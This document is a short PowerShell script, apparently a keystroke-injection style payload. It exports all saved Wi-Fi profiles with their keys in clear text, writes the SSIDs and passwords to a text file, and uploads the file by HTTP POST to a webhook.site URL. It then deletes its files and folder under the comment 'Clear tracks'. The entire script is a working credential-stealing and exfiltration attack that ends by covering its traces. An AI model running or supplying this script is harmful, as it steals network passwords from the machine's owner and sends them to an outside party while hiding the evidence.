# Working Directory
$wd = "C:\WiFi"
mkdir $wd
cd $wd

# Get passwords and SSIDs
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$row= "---------------------`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $row
}

# Make your own webhook and insert your unique id
# https://webhook.site
Invoke-WebRequest -Uri https://webhook.site/5a3610fb-2789-404a-b42d-af8a689e5e13 -Method POST -InFile wifipass.txt -UseBasicParsing

# Clear tracks
rm *.xml
rm *.txt
cd ..
rm WiFi
